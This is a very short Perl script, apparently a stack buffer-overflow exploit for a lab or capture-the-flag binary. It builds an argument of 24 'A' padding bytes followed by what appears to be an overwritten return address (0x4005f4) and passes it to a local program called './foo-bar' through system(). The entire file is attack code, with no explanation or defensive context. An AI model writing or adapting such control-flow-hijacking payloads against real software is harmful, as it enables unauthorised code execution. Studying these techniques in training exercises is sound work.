#!/usr/bin/env perl

use strict;

my $fill = "A" x 24;
my $arg = $fill."\xf4\x05\x40";
my $cmd = "./foo-bar ".$arg;

system($cmd);
